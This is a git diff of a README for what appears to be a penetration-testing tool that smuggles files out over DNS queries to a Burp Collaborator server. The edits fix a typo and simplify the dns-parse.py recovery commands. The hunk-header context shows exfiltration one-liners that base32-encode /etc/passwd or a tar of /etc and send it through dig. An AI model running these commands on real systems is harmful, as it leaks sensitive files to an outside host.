@@ -35,7 +35,7 @@ Thanks and credit to [Xavier Mertens](https://www.sans.org/profiles/xavier-merte
 
 Note that you will receive more reliable results by specifying the name server via `dig @`...
 
-In the examples below: `<DNS Name>` is the random name proovided by Burp Collaborator. For example: `q3uv485lz802ad6a7xz6c2izvq1hp6` if your Beef Collaborator address is `q3uv485lz802ad6a7xz6c2izvq1hp6.oastify.com`.
+In the examples below: `<DNS Name>` is the random name provided by Burp Collaborator. For example: `q3uv485lz802ad6a7xz6c2izvq1hp6` if your Beef Collaborator address is `q3uv485lz802ad6a7xz6c2izvq1hp6.oastify.com`.
 
 ### Exfiltrate a file:
 
@@ -46,13 +46,13 @@ cat /etc/passwd | base32 -w 63 | tr -d = | while read a; do dig @<DNS Server> $a
 To recover the file (on a bind DNS server):
 
 ```
-./dns-parse.py <DNS Name> query.log bind | base32 -d
+./dns-parse.py <DNS Name> query.log | base32 -d
 ```
 
 To recover the file (on a private Burp Collaborator server):
 
 ```
-./dns-parse.py <DNS Name> collaborator.log collaborator | base32 -d
+./dns-parse.py <DNS Name> collaborator.log | base32 -d
 ```
 
 ### Exfiltrate a compressed file:
@@ -64,13 +64,13 @@ cat /etc/passwd | gzip - | base32 -w 63 | tr -d = | while read a; do dig @<DNS S
 To recover/unzip the file (on a bind DNS server):
 
 ```
-./dns-parse.py <DNS Name> query.log bind | base32 -d | zcat
+./dns-parse.py <DNS Name> query.log| base32 -d | zcat
 ```
 
 To recover/unzip the file (on a private Burp Collaborator server):
 
 ```
-./dns-parse.py <DNS Name> collaborator.log collaborator | base32 -d | zcat 
+./dns-parse.py <DNS Name> collaborator.log | base32 -d | zcat 
 ```
 
 ### Exfiltrate a compressed tar archive of a directory:
@@ -84,11 +84,11 @@ tar czf - /etc | base32 -w 63 |tr -d = | while read a; do dig @<DNS Server> $a.<
 To recover the tar archive (on a bind DNS server):
 
 ```
-./dns-parse.py <DNS Name> query.log bind | base32 -d > exfiltrated.tgz
+./dns-parse.py <DNS Name> query.log | base32 -d > exfiltrated.tgz
 ```
 
 To recover the tar file (on a bind DNS server):
 
 ```
-./dns-parse.py <DNS Name> collaborator.log collaborator | base32 -d > exfiltrated.tgz
+./dns-parse.py <DNS Name> collaborator.log | base32 -d > exfiltrated.tgz
 ```
